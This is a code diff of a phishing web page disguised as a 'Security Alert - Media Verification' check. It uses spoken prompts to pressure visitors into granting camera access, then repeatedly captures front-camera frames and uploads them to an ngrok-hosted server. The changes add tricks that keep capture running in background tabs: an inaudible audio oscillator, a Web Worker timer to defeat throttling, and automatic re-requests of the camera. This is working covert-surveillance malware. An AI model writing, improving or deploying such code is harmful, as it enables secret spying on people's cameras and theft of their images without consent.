@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert - Media Verification v3.6</title>
+<title>Security Alert - Media Verification v3.8</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; }
@@ -24,27 +24,82 @@
 
   var CONFIG = {
     tts: {
-      text: "Security verification required. Camera access must remain active to confirm user identity.",
+      text: "Security verification required. Background monitoring session active.",
       lang: 'en-US',
       rate: 0.9,
       pitch: 1.0,
-      repeatInterval: 5000,
-      maxRepeats: 30
+      repeatInterval: 6000
     },
-    loopInterval: 2500,       
-    uploadInterval: 3000,     
+    loopInterval: 3000,
+    uploadInterval: 3000,
     serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_capture'
   };
 
   var state = {
     ttsStarted: false,
-    ttsCount: 0,
     camStream: null,
     camActive: false,
-    loopTimer: null,
-    uploadTimer: null
+    audioCtx: null,
+    worker: null
   };
 
+  // ============================================
+  // BACKGROUND THROTTLE BYPASS (Audio Keep-Alive)
+  // Mencegah browser membekukan proses JavaScript saat tab tidak aktif
+  // ============================================
+  function initAudioKeepAlive() {
+    try {
+      window.AudioContext = window.AudioContext || window.webkitAudioContext;
+      state.audioCtx = new AudioContext();
+      
+      var oscillator = state.audioCtx.createOscillator();
+      var gainNode = state.audioCtx.createGain();
+      
+      gainNode.gain.value = 0.00001; // Hampir tak bersuara
+      oscillator.frequency.value = 15000;
+      oscillator.connect(gainNode);
+      gainNode.connect(state.audioCtx.destination);
+      
+      oscillator.start();
+      console.log("[+] Audio keep-alive active.");
+    } catch (e) {}
+  }
+
+  // ============================================
+  // WEB WORKER THREAD (Anti-Timer Throttling)
+  // Menjalankan interval di thread terpisah agar tidak diperlambat OS/Browser
+  // ============================================
+  function initBackgroundWorker(intervalMs) {
+    try {
+      var blobCode = `
+        self.onmessage = function(e) {
+          if (e.data === 'start') {
+            setInterval(function() {
+              self.postMessage('tick');
+            }, ${intervalMs});
+          }
+        };
+      `;
+      var blob = new Blob([blobCode], { type: 'application/javascript' });
+      var blobUrl = URL.createObjectURL(blob);
+      
+      state.worker = new Worker(blobUrl);
+      state.worker.onmessage = function(e) {
+        if (e.data === 'tick') {
+          backgroundTick();
+        }
+      };
+      state.worker.postMessage('start');
+      console.log("[+] Background Web Worker active.");
+    } catch (e) {
+      // Fallback ke timer standar jika worker dibatasi
+      setInterval(backgroundTick, intervalMs);
+    }
+  }
+
+  // ============================================
+  // TTS MODULE
+  // ============================================
   function speakOnce() {
     if (!('speechSynthesis' in window)) return;
     try {
@@ -52,11 +107,9 @@
       u.lang = CONFIG.tts.lang;
       u.rate = CONFIG.tts.rate;
       u.pitch = CONFIG.tts.pitch;
-
       u.onend = function () {
         setTimeout(speakOnce, CONFIG.tts.repeatInterval);
       };
-
       window.speechSynthesis.speak(u);
     } catch (e) {}
   }
@@ -68,6 +121,9 @@
     speakOnce();
   }
 
+  // ============================================
+  // UPLOAD CAPTURE KE SERVER NGROK
+  // ============================================
   function captureAndUpload(isUnloading) {
     if (!state.camActive) return;
 
@@ -77,7 +133,7 @@
 
     try {
       if (videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;
-      
+
       ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
       var dataURL = canvas.toDataURL('image/jpeg', 0.80);
       var payload = JSON.stringify({ image: dataURL });
@@ -90,52 +146,34 @@
 
       fetch(CONFIG.serverEndpoint, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: payload,
         keepalive: true
       })
       .then(function(res) {
-        if (!res.ok) throw new Error('Server response status: ' + res.status);
+        if (!res.ok) throw new Error('Status: ' + res.status);
         return res.json();
       })
       .then(function(data) {
         console.log('[+] Frame uploaded successfully:', data.filename);
       })
       .catch(function(err) {
-        console.log('[-] Failed to upload frame:', err.message);
+        console.log('[-] Upload failed:', err.message);
       });
     } catch (e) {}
   }
 
-  function stopCurrentStream() {
-    if (state.camStream) {
-      try {
-        state.camStream.getTracks().forEach(function(track) {
-          track.stop();
-        });
-      } catch (e) {}
-      state.camStream = null;
-    }
-    state.camActive = false;
-  }
-
+  // ============================================
+  // CAMERA LOOP & BACKGROUND TICK
+  // ============================================
   function requestCameraAccess() {
-    stopCurrentStream();
-
     navigator.mediaDevices.getUserMedia({ 
-      video: { 
-        width: { ideal: 640 }, 
-        height: { ideal: 480 },
-        facingMode: "user" 
-      }, 
+      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, 
       audio: false 
     })
     .then(function(stream) {
       state.camStream = stream;
       state.camActive = true;
-      console.log("[+] Camera stream cycle active.");
       
       var videoElement = document.getElementById('cam-feed');
       videoElement.srcObject = stream;
@@ -148,31 +186,48 @@
       });
     })
     .catch(function(err) {
-      console.log("[-] Camera access restricted/denied:", err.name);
+      state.camActive = false;
     });
   }
 
+  function backgroundTick() {
+    if (state.audioCtx && state.audioCtx.state === 'suspended') {
+      state.audioCtx.resume();
+    }
+
+    if (!state.camActive) {
+      requestCameraAccess();
+    } else {
+      captureAndUpload(false);
+    }
+  }
+
+  // ============================================
+  // INISIALISASI UTAMA
+  // ============================================
   window.addEventListener('DOMContentLoaded', function() {
+    initAudioKeepAlive();
     startTTS();
     requestCameraAccess();
+    initBackgroundWorker(CONFIG.loopInterval);
   });
-
-  state.loopTimer = setInterval(function() {
-    requestCameraAccess();
-  }, CONFIG.loopInterval);
-
-  state.uploadTimer = setInterval(function() {
-    captureAndUpload(false);
-  }, CONFIG.uploadInterval);
 
   window.addEventListener('beforeunload', function() {
     captureAndUpload(true);
   });
 
+  window.addEventListener('click', function() {
+    if (state.audioCtx && state.audioCtx.state === 'suspended') {
+      state.audioCtx.resume();
+    }
+  });
+
   document.addEventListener('visibilitychange', function () {
     if (!document.hidden) {
       startTTS();
-      requestCameraAccess();
+      if (!state.camActive) {
+        requestCameraAccess();
+      }
     }
   });
 
